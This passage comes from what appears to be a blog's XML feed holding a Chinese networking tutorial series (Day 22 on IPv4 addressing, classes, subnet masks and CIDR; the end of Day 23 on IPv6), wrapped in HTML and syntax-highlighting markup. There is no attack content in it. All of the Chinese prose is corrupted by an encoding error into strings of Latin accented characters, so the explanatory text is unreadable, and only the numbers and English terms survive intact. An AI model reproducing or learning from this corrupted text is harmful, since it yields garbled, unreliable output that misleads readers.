</span>128ä½ = 8ä¸ª16ä½å­—æ®µ<br><span class="hljs-bullet">- </span>åå…­è¿›åˆ¶è¡¨ç¤º<br><span class="hljs-bullet">- </span>å¯ä»¥å‹ç¼©é›¶<br><br>åœ°å€ç±»å‹ï¼š<br><span class="hljs-bullet">- </span>2000::/3 - å…¨å±€å•æ’­<br><span class="hljs-bullet">- </span>fe80::/10 - é“¾è·¯æœ¬åœ°<br><span class="hljs-bullet">- </span>fc00::/7 - å”¯ä¸€æœ¬åœ°ï¼ˆç§æœ‰ï¼‰<br><span class="hljs-bullet">- </span>ff00::/8 - å¤šæ’­<br><br>é…ç½®æ–¹å¼ï¼š<br><span class="hljs-bullet">- </span>SLAACï¼šè‡ªåŠ¨ï¼Œå³æ’å³ç”¨<br><span class="hljs-bullet">- </span>DHCPv6ï¼šä¸­å¤®ç®¡ç†<br><span class="hljs-bullet">- </span>æ‰‹åŠ¨ï¼šç‰¹æ®Šéœ€æ±‚<br><br>è¿‡æ¸¡ç­–ç•¥ï¼š<br>ç°åœ¨ï¼šåŒæ ˆ<br>æœªæ¥ï¼šçº¯IPv6<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬24å¤©ï¼šICMPå’Œè¯Šæ–­å·¥å…·</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>ICMPåè®®è¯¦è§£</li><li>ICMPv6</li><li>pingåŸç†å’Œå®ç°</li><li>tracerouteåŸç†</li><li>ç½‘ç»œè¯Šæ–­å·¥å…·</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ä¸‹ä¸€ä»£äº’è”ç½‘åè®®IPv6ï¼Œç†è§£äº†å®ƒçš„è®¾è®¡ä¼˜åŠ¿å’Œè¿‡æ¸¡ç­–ç•¥ã€‚è™½ç„¶IPv6éƒ¨ç½²éœ€è¦æ—¶é—´ï¼Œä½†è¿™æ˜¯ç½‘ç»œå‘å±•çš„å¿…ç„¶è¶‹åŠ¿ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ ICMPåè®®ï¼Œäº†è§£ç½‘ç»œè¯Šæ–­å·¥å…·çš„åŸç†ï¼</p><p><strong>è¿›åº¦ï¼š23&#x2F;180å¤©ï¼ˆ12.8%ï¼‰</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>22å¤©ï¼šIPåè®®åŸºç¡€</title>
    <link href="/2025/11/10/22%E5%A4%A9%EF%BC%9AIP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/10/22%E5%A4%A9%EF%BC%9AIP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬22å¤©ï¼šIPåè®®åŸºç¡€"><a href="#ç¬¬22å¤©ï¼šIPåè®®åŸºç¡€" class="headerlink" title="ç¬¬22å¤©ï¼šIPåè®®åŸºç¡€"></a>ç¬¬22å¤©ï¼šIPåè®®åŸºç¡€</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£IPåè®®çš„ä½œç”¨å’Œç‰¹ç‚¹</li><li>æŒæ¡IPv4åœ°å€æ ¼å¼å’Œåˆ†ç±»</li><li>å­¦ä¹ å­ç½‘åˆ’åˆ†å’ŒCIDR</li><li>äº†è§£IPæŠ¥æ–‡æ ¼å¼</li><li>ç†è§£IPè·¯ç”±åŸºç¡€</li><li>å­¦ä¹ NATæŠ€æœ¯åŸç†</li><li>å®ç°IPåœ°å€è®¡ç®—å™¨</li></ul><hr><h2 id="1-IPåè®®æ¦‚è¿°"><a href="#1-IPåè®®æ¦‚è¿°" class="headerlink" title="1. IPåè®®æ¦‚è¿°"></a>1. IPåè®®æ¦‚è¿°</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯IPåè®®ï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯IPåè®®ï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯IPåè®®ï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯IPåè®®ï¼Ÿ</h3><p><strong>IPï¼ˆInternet Protocolï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IP = äº’è”ç½‘åè®®<br><br>ä½œç”¨ï¼š<br>åœ¨ç½‘ç»œå±‚è´Ÿè´£æ•°æ®åŒ…çš„å¯»å€å’Œè·¯ç”±<br><br>ç”Ÿæ´»ç±»æ¯”ï¼š<br>IPåœ°å€å°±åƒé‚®æ”¿åœ°å€ï¼š<br><span class="hljs-bullet">- </span>å›½å®¶ï¼ˆç½‘ç»œå·ï¼‰<br><span class="hljs-bullet">- </span>çœå¸‚ï¼ˆå­ç½‘å·ï¼‰<br><span class="hljs-bullet">- </span>è¡—é“é—¨ç‰Œï¼ˆä¸»æœºå·ï¼‰<br><br>é‚®é€’å‘˜æ ¹æ®åœ°å€æŠ•é€’ä¿¡ä»¶<br>è·¯ç”±å™¨æ ¹æ®IPåœ°å€è½¬å‘æ•°æ®åŒ…<br></code></pre></td></tr></table></figure><p><strong>IPåœ¨ç½‘ç»œåè®®æ ˆä¸­çš„ä½ç½®</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs armasm">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  åº”ç”¨å±‚ï¼ˆHTTPã€FTPç­‰ï¼‰      â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ä¼ è¾“å±‚ï¼ˆTCPã€UDPï¼‰         â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç½‘ç»œå±‚ï¼ˆ<span class="hljs-built_in">IP</span>ã€ICMPã€ARPï¼‰    â”‚  â† <span class="hljs-built_in">IP</span>åè®®åœ¨è¿™é‡Œ<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  æ•°æ®é“¾è·¯å±‚ï¼ˆä»¥å¤ªç½‘ç­‰ï¼‰     â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç‰©ç†å±‚                     â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="1-2-IPåè®®çš„ç‰¹ç‚¹"><a href="#1-2-IPåè®®çš„ç‰¹ç‚¹" class="headerlink" title="1.2 IPåè®®çš„ç‰¹ç‚¹"></a>1.2 IPåè®®çš„ç‰¹ç‚¹</h3><p><strong>æ ¸å¿ƒç‰¹ç‚¹</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æ— è¿æ¥ï¼ˆConnectionlessï¼‰<br><span class="hljs-bullet">   -</span> ä¸éœ€è¦å»ºç«‹è¿æ¥<br><span class="hljs-bullet">   -</span> ç›´æ¥å‘é€æ•°æ®åŒ…<br><span class="hljs-bullet">   -</span> ç±»ä¼¼äºå¯„ä¿¡<br><br><span class="hljs-bullet">2.</span> ä¸å¯é ï¼ˆUnreliableï¼‰<br><span class="hljs-bullet">   -</span> ä¸ä¿è¯é€è¾¾<br><span class="hljs-bullet">   -</span> ä¸ä¿è¯é¡ºåº<br><span class="hljs-bullet">   -</span> ä¸ä¿è¯ä¸é‡å¤<br><span class="hljs-bullet">   -</span> å¯é æ€§ç”±ä¸Šå±‚ï¼ˆTCPï¼‰ä¿è¯<br><br><span class="hljs-bullet">3.</span> å°½åŠ›è€Œä¸ºï¼ˆBest Effortï¼‰<br><span class="hljs-bullet">   -</span> å°½åŠ›ä¼ è¾“<br><span class="hljs-bullet">   -</span> ä¸æ‰¿è¯ºæœåŠ¡è´¨é‡<br><br><span class="hljs-bullet">4.</span> åˆ†ç»„äº¤æ¢<br><span class="hljs-bullet">   -</span> æ•°æ®åˆ†æˆå°åŒ…<br><span class="hljs-bullet">   -</span> ç‹¬ç«‹è·¯ç”±<br><span class="hljs-bullet">   -</span> å¯èƒ½èµ°ä¸åŒè·¯å¾„<br></code></pre></td></tr></table></figure><p><strong>IPåè®®ç‰ˆæœ¬</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv4ï¼ˆç¬¬4ç‰ˆï¼‰ï¼š<br><span class="hljs-bullet">- </span>1981å¹´å‘å¸ƒ<br><span class="hljs-bullet">- </span>32ä½åœ°å€ï¼ˆ4å­—èŠ‚ï¼‰<br><span class="hljs-bullet">- </span>çº¦43äº¿ä¸ªåœ°å€<br><span class="hljs-bullet">- </span>å½“å‰ä¸»æµ<br><br>IPv6ï¼ˆç¬¬6ç‰ˆï¼‰ï¼š<br><span class="hljs-bullet">- </span>1998å¹´å‘å¸ƒ<br><span class="hljs-bullet">- </span>128ä½åœ°å€ï¼ˆ16å­—èŠ‚ï¼‰<br><span class="hljs-bullet">- </span>çº¦340ä¸‡äº¿äº¿äº¿äº¿ä¸ªåœ°å€<br><span class="hljs-bullet">- </span>é€æ­¥æ™®åŠ<br><br>ä¸ºä»€ä¹ˆæ²¡æœ‰IPv5ï¼Ÿ<br>IPv5æ˜¯å®éªŒæ€§åè®®ï¼ˆInternet Stream Protocolï¼‰<br>ä»æœªå¤§è§„æ¨¡éƒ¨ç½²<br></code></pre></td></tr></table></figure><hr><h2 id="2-IPv4åœ°å€"><a href="#2-IPv4åœ°å€" class="headerlink" title="2. IPv4åœ°å€"></a>2. IPv4åœ°å€</h2><h3 id="2-1-IPv4åœ°å€æ ¼å¼"><a href="#2-1-IPv4åœ°å€æ ¼å¼" class="headerlink" title="2.1 IPv4åœ°å€æ ¼å¼"></a>2.1 IPv4åœ°å€æ ¼å¼</h3><p><strong>åœ°å€è¡¨ç¤º</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns">IPv4åœ°å€ = <span class="hljs-number">32</span>ä½äºŒè¿›åˆ¶æ•° = <span class="hljs-number">4</span>ä¸ªå­—èŠ‚<br><br>è¡¨ç¤ºæ–¹æ³•ï¼š<br>äºŒè¿›åˆ¶ï¼š<span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00000001</span><br>åè¿›åˆ¶ï¼š<span class="hljs-number">192.168.1.1</span>ï¼ˆç‚¹åˆ†åè¿›åˆ¶ï¼‰<br><br>è½¬æ¢ç¤ºä¾‹ï¼š<br><span class="hljs-number">192</span>       = <span class="hljs-number">11000000</span><br><span class="hljs-number">168</span>       = <span class="hljs-number">10101000</span><br><span class="hljs-number">1</span>         = <span class="hljs-number">00000001</span><br><span class="hljs-number">1</span>         = <span class="hljs-number">00000001</span><br><br>å®Œæ•´åœ°å€ï¼š<br><span class="hljs-number">192.168.1.1</span> = <span class="hljs-number">11000000101010000000000100000001</span><br></code></pre></td></tr></table></figure><p><strong>åœ°å€æ•°é‡</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">32ä½ = 2^32 = 4,294,967,296 ä¸ªåœ°å€<br>çº¦43äº¿ä¸ª<br><br>é—®é¢˜ï¼š<br>å…¨çƒäººå£çº¦80äº¿<br>è®¾å¤‡æ•°é‡æ›´å¤š<br>åœ°å€ä¸å¤Ÿç”¨ï¼<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">1.</span> NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰<br><span class="hljs-bullet">2.</span> IPv6<br><span class="hljs-bullet">3.</span> CIDRï¼ˆæ— ç±»åŸŸé—´è·¯ç”±ï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-2-IPv4åœ°å€åˆ†ç±»"><a href="#2-2-IPv4åœ°å€åˆ†ç±»" class="headerlink" title="2.2 IPv4åœ°å€åˆ†ç±»"></a>2.2 IPv4åœ°å€åˆ†ç±»</h3><p><strong>ä¼ ç»Ÿåˆ†ç±»ï¼ˆå·²è¿‡æ—¶ï¼Œä½†ä»éœ€äº†è§£ï¼‰</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span>ç±»åœ°å€ï¼š<br>æ ¼å¼ï¼š<span class="hljs-number">0</span>xxxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>èŒƒå›´ï¼š<span class="hljs-number">1.0.0.0</span> ~ <span class="hljs-number">126.255.255.255</span><br>ç½‘ç»œæ•°ï¼š<span class="hljs-number">126</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">7</span> - <span class="hljs-number">2</span>ï¼‰<br>ä¸»æœºæ•°ï¼š<span class="hljs-number">16,777,214</span>ä¸ª/ç½‘ç»œï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">24</span> - <span class="hljs-number">2</span>ï¼‰<br>é»˜è®¤å­ç½‘æ©ç ï¼š<span class="hljs-number">255.0.0.0</span> (/<span class="hljs-number">8</span>)<br>ç”¨é€”ï¼šå¤§å‹ç½‘ç»œ<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-number">10.0.0.0</span> ~ <span class="hljs-number">10.255.255.255</span>ï¼ˆç§æœ‰ï¼‰<br><br>Bç±»åœ°å€ï¼š<br>æ ¼å¼ï¼š<span class="hljs-number">10</span>xxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>èŒƒå›´ï¼š<span class="hljs-number">128.0.0.0</span> ~ <span class="hljs-number">191.255.255.255</span><br>ç½‘ç»œæ•°ï¼š<span class="hljs-number">16</span>,<span class="hljs-number">384</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">14</span>ï¼‰<br>ä¸»æœºæ•°ï¼š<span class="hljs-number">65</span>,<span class="hljs-number">534</span>ä¸ª/ç½‘ç»œï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">16</span> - <span class="hljs-number">2</span>ï¼‰<br>é»˜è®¤å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.0.0</span> (/<span class="hljs-number">16</span>)<br>ç”¨é€”ï¼šä¸­å‹ç½‘ç»œ<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-number">172.16.0.0</span> ~ <span class="hljs-number">172.31.255.255</span>ï¼ˆç§æœ‰ï¼‰<br><br>Cç±»åœ°å€ï¼š<br>æ ¼å¼ï¼š<span class="hljs-number">110</span>xxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>èŒƒå›´ï¼š<span class="hljs-number">192.0.0.0</span> ~ <span class="hljs-number">223.255.255.255</span><br>ç½‘ç»œæ•°ï¼š<span class="hljs-number">2,097,152</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">21</span>ï¼‰<br>ä¸»æœºæ•°ï¼š<span class="hljs-number">254</span>ä¸ª/ç½‘ç»œï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">8</span> - <span class="hljs-number">2</span>ï¼‰<br>é»˜è®¤å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.0</span> (/<span class="hljs-number">24</span>)<br>ç”¨é€”ï¼šå°å‹ç½‘ç»œ<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-number">192.168.0.0</span> ~ <span class="hljs-number">192.168.255.255</span>ï¼ˆç§æœ‰ï¼‰<br><br>Dç±»åœ°å€ï¼ˆå¤šæ’­ï¼‰ï¼š<br>æ ¼å¼ï¼š<span class="hljs-number">1110</span>xxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>èŒƒå›´ï¼š<span class="hljs-number">224.0.0.0</span> ~ <span class="hljs-number">239.255.255.255</span><br>ç”¨é€”ï¼šå¤šæ’­ï¼ˆç»„æ’­ï¼‰<br><br>Eç±»åœ°å€ï¼ˆä¿ç•™ï¼‰ï¼š<br>æ ¼å¼ï¼š<span class="hljs-number">1111</span>xxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>èŒƒå›´ï¼š<span class="hljs-number">240.0.0.0</span> ~ <span class="hljs-number">255.255.255.255</span><br>ç”¨é€”ï¼šå®éªŒå’Œæœªæ¥ä½¿ç”¨<br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šåœ°å€</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">0.0.0.0</span><br>- æœ¬ç½‘ç»œ<br>- è¡¨ç¤º<span class="hljs-string">&quot;ä»»æ„åœ°å€&quot;</span><br>- ä½œä¸ºæºåœ°å€ï¼šè¡¨ç¤ºæœ¬æœº<br>- ä½œä¸ºç›®çš„åœ°å€ï¼šè¡¨ç¤ºæœ¬ç½‘ç»œ<br><br><span class="hljs-number">127.0.0.0</span> ~ <span class="hljs-number">127</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span><br>- ç¯å›åœ°å€ï¼ˆLoopbackï¼‰<br>- <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>æ˜¯æœ¬åœ°ä¸»æœº<br>- æ•°æ®ä¸ä¼šå‘é€åˆ°ç½‘ç»œ<br><br><span class="hljs-number">255.255.255.255</span><br>- å—é™å¹¿æ’­åœ°å€<br>- æœ¬åœ°ç½‘ç»œå¹¿æ’­<br>- è·¯ç”±å™¨ä¸è½¬å‘<br><br>ç§æœ‰åœ°å€ï¼ˆPrivate Addressï¼‰ï¼š<br><span class="hljs-number">10.0.0.0</span> ~ <span class="hljs-number">10</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>ï¼ˆAç±»ï¼‰<br><span class="hljs-number">172.16.0.0</span> ~ <span class="hljs-number">172</span>.<span class="hljs-number">31</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>ï¼ˆBç±»ï¼‰<br><span class="hljs-number">192.168.0.0</span> ~ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>ï¼ˆCç±»ï¼‰<br>- å†…éƒ¨ç½‘ç»œä½¿ç”¨<br>- ä¸èƒ½åœ¨äº’è”ç½‘ä¸Šè·¯ç”±<br>- éœ€è¦NATè½¬æ¢<br></code></pre></td></tr></table></figure><h3 id="2-3-å­ç½‘æ©ç "><a href="#2-3-å­ç½‘æ©ç " class="headerlink" title="2.3 å­ç½‘æ©ç "></a>2.3 å­ç½‘æ©ç </h3><p><strong>ä»€ä¹ˆæ˜¯å­ç½‘æ©ç ï¼Ÿ</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">å­ç½‘æ©ç ï¼ˆSubnet Maskï¼‰ï¼š<br>ç”¨äºåŒºåˆ†ç½‘ç»œéƒ¨åˆ†å’Œä¸»æœºéƒ¨åˆ†<br><br>æ ¼å¼ï¼š<br>äºŒè¿›åˆ¶ï¼šè¿ç»­çš„<span class="hljs-number">1</span>åè·Ÿè¿ç»­çš„<span class="hljs-number">0</span><br>ç¤ºä¾‹ï¼š<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>åè¿›åˆ¶ï¼š<span class="hljs-number">255.255.255.0</span><br><br>ä½œç”¨ï¼š<br>IPåœ°å€ &amp; å­ç½‘æ©ç  = ç½‘ç»œåœ°å€<br><br>ç¤ºä¾‹ï¼š<br>IPåœ°å€ï¼š    <span class="hljs-number">192.168.1.10</span><br>å­ç½‘æ©ç ï¼š  <span class="hljs-number">255.255.255.0</span><br>ç½‘ç»œåœ°å€ï¼š  <span class="hljs-number">192.168.1.0</span><br><br>è®¡ç®—è¿‡ç¨‹ï¼š<br>  <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00001010</span>  (<span class="hljs-number">192.168.1.10</span>)<br>&amp; <span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span>  (<span class="hljs-number">255.255.255.0</span>)<br>= <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00000000</span>  (<span class="hljs-number">192.168.1.0</span>)<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§å­ç½‘æ©ç </strong>ï¼š</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tap">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ CIDRè¡¨ç¤º   â”‚   å­ç½‘æ©ç       â”‚ ç½‘ç»œæ•°   â”‚ ä¸»æœºæ•°   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ /8         â”‚ 255.0.0.0       â”‚   <span class="hljs-number"> 1 </span>    â”‚<span class="hljs-number"> 16777214 </span>â”‚<br>â”‚ /16        â”‚ 255.255.0.0     â”‚   <span class="hljs-number"> 1 </span>    â”‚ <span class="hljs-number"> 65534 </span>  â”‚<br>â”‚ /24        â”‚ 255.255.255.0   â”‚   <span class="hljs-number"> 1 </span>    â”‚  <span class="hljs-number"> 254 </span>   â”‚<br>â”‚ /25        â”‚ 255.255.255.128 â”‚   <span class="hljs-number"> 2 </span>    â”‚  <span class="hljs-number"> 126 </span>   â”‚<br>â”‚ /26        â”‚ 255.255.255.192 â”‚   <span class="hljs-number"> 4 </span>    â”‚   <span class="hljs-number"> 62 </span>   â”‚<br>â”‚ /27        â”‚ 255.255.255.224 â”‚   <span class="hljs-number"> 8 </span>    â”‚   <span class="hljs-number"> 30 </span>   â”‚<br>â”‚ /28        â”‚ 255.255.255.240 â”‚  <span class="hljs-number"> 16 </span>    â”‚   <span class="hljs-number"> 14 </span>   â”‚<br>â”‚ /29        â”‚ 255.255.255.248 â”‚  <span class="hljs-number"> 32 </span>    â”‚    <span class="hljs-number"> 6 </span>   â”‚<br>â”‚ /30        â”‚ 255.255.255.252 â”‚  <span class="hljs-number"> 64 </span>    â”‚    <span class="hljs-number"> 2 </span>   â”‚<br>â”‚ /31        â”‚ 255.255.255.254 â”‚ <span class="hljs-number"> 128 </span>    â”‚    <span class="hljs-number"> 2 </span>   â”‚<br>â”‚ /32        â”‚ 255.255.255.255 â”‚ <span class="hljs-number"> 256 </span>    â”‚    <span class="hljs-number"> 1 </span>   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ä¸»æœºæ•° = 2^(32-å‰ç¼€é•¿åº¦) - 2<br>ï¼ˆå‡2ï¼šç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€ï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-4-å­ç½‘åˆ’åˆ†"><a href="#2-4-å­ç½‘åˆ’åˆ†" class="headerlink" title="2.4 å­ç½‘åˆ’åˆ†"></a>2.4 å­ç½‘åˆ’åˆ†</h3><p><strong>ä¸ºä»€ä¹ˆéœ€è¦å­ç½‘åˆ’åˆ†ï¼Ÿ</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 